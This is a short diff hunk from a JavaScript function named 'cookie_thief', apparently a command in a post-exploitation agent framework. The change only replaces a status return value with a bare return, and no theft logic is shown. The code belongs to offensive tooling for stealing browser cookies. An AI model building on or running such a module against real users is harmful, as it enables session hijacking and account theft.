@@ -51,5 +51,5 @@ exports.cookie_thief = function(task, command, params){
     catch(error)  {
         return {'user_output': error.toString(), "completed": true, "status": "error"};
     }
-    return keyDL_status;
+    return;
 };
